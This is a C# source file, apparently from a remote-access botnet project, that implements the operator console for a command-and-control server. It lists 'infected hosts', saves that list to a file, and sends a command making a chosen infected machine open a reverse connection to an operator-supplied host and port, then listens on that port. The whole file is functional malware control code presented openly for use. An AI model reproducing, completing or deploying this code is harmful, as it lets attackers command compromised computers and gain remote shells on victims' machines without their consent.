using Master.AdvancedConsole;
using Master.Botnet.JSON;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

namespace Master.Botnet
{
    public static class BotnetManager
    {
        const string SERVER_ADDRESS = "http://localhost/backnet/";

        internal const string KEY = "{your_key_here}";

        static readonly HttpClient httpClient;

        static readonly JsonSerializerSettings jsonSerializerSettings;

        /// <summary>
        /// Instanciate the http client
        /// and the JsonSerializerSettings object to enable error throwing on missing members during deserialization
        /// </summary>
        static BotnetManager()
        {
            httpClient = new HttpClient();

            // This is required to ensure correct properties name are retrieved, and throw exceptions if not
            jsonSerializerSettings = new JsonSerializerSettings
            {
                MissingMemberHandling = MissingMemberHandling.Error
            };
        }

        /// <summary>
        /// Botnet's entry point, asks the user what commands to issue to the master botnet server.
        /// If the user chooses to send a reverse connection request to an infected host via the master botnet server,
        /// an integer may be returned to specify the MasterManager main method to listen for incoming connections on that port.
        /// </summary>
        /// <returns>Port number to listen on or null</returns>
        public static int? Process()
        {
            ColorTools.WriteCommandMessage($"Checking if server {SERVER_ADDRESS} is up...");
            var data = JsonConvert.SerializeObject(new CheckServerRequestJson());

            // If an error occured, return
            if (PostJsonToServer<CheckServerResponseJson>(data) == null) return null;

            ColorTools.WriteCommandSuccess("Server is up and responded as intended");

            var choice = "";
            while (choice != "9")
            {
                Console.Write("\n\nChoose one option :\n\n    1 : View infected hosts\n    2 : Make infected host connect\n    9 : Exit\n\nChoice : ");

                // Reset choice here or infinite loop
                choice = "";
                while (choice != "1" && choice != "2" && choice != "9")
                {
                    choice = Console.ReadLine();
                    // Space a bit
                    Console.WriteLine("");

                    switch (choice)
                    {
                        case "1":
                            GetInfectedHosts();
                            break;

                        case "2":
                            // If the user chose a port, return it to the main loop to listen on it
                            var port = SendReverseConnectionRequestToHost();
                            if (port != null) return port;
                            break;

                        case "9":
                            // exit
                            break;

                        default:
                            Console.Write("Invalid choice, please type again\n> ");
                            break;
                    }
                }
            }

            return null;
        }

        #region Botnet commands

        /// <summary>
        /// Request the infected hosts list from the server and save it into a file
        /// </summary>
        static void GetInfectedHosts()
        {
            var data = JsonConvert.SerializeObject(new ViewHostsRequestJson());
            var response = PostJsonToServer<List<InfectedHostJson>>(data);
            if (response == null) return;

            var path = Path.Combine(Environment.CurrentDirectory, "infected_hosts.txt");
            try
            {
                File.WriteAllLines(path, response.Select(x => x.ToString()));
                ColorTools.WriteCommandSuccess($"Successfully wrote infected hosts listing file at :\n     {path}");
            }
            catch (Exception)
            {
                ColorTools.WriteCommandError($"Couldn't write infected hosts listing file at {path}");
            }
        }

        /// <summary>
        /// Ask the user for an hostname/ip, a port number and an host_id.
        /// Send the request to the server wich will tell the infected host (identified by host_id) the connect to the specified host and port.
        /// The user can choose to listen to the specified port.
        /// </summary>
        /// <returns>Port number to listen to or null</returns>
        static int? SendReverseConnectionRequestToHost()
        {
            Console.Write("Please type the host_id to send the reverse connection request to : ");
            var host_id = ConsoleTools.PromptInt(null, "Please enter an integer");

            Console.Write("Please type the hostname or ip adress the infected host should connect to (yours ?) : ");
            var host = ConsoleTools.PromptNonEmptyString();

            var port = ConsoleTools.AskForPortNumber("Port");

            var data = JsonConvert.SerializeObject(new ConnectClientRequestJson(host_id, host, port));
            var response = PostJsonToServer<ConnectClientResponseJson>(data);
            if (response == null) return null;

            if (!response.result)
            {
                ColorTools.WriteCommandError("The server responded with an error, verify the host_id");
                return null;
            }

            ColorTools.WriteCommandSuccess("Command successfully sent");

            Console.Write("Would you like to listen on the selected port now ? (Y/n) : ");
            var choice = Console.ReadLine();

            if (choice == "n" || choice == "N") return null;

            return port;
        }

        #endregion Botnet commands

        #region Server Request - response

        /// <summary>
        /// Call GetServerStringResponse, catch exceptions on response and deserialization.
        /// Return the deserialized response object.
        /// </summary>
        /// <typeparam name="T">Expected response type</typeparam>
        /// <param name="json">Json string to POST</param>
        /// <returns>Response json class or null</returns>
        static T PostJsonToServer<T>(string json)
        {
            T response = default(T);
            string error = null;
            try
            {
                response = JsonConvert.DeserializeObject<T>(GetServerStringResponse(json).Result, jsonSerializerSettings);
                if(response == null) throw new JsonSerializationException();
            }
            catch (JsonSerializationException)
            {
                error = "The server sent an invalid response, this may mean it has been compromised or is misconfigured...";
            }
            catch (Exception)
            {
                error = "The master server didn't respond";
            }

            if (error != null)
            {
                ColorTools.WriteCommandError(error);
            }

            return response;
        }

        /// <summary>
        /// Send POST request to server and wait for his response
        /// </summary>
        /// <param name="data">Data to send in POST request</param>
        /// <returns>Server response : Task(string)</returns>
        static async Task<string> GetServerStringResponse(string data)
        {
            var parameters = new Dictionary<string, string>
            {
                ["data"] = data
            };

            var response = await httpClient.PostAsync(SERVER_ADDRESS, new FormUrlEncodedContent(parameters));
            var contents = await response.Content.ReadAsStringAsync();

            return contents;
        }

        #endregion Server Request - response
    }
}
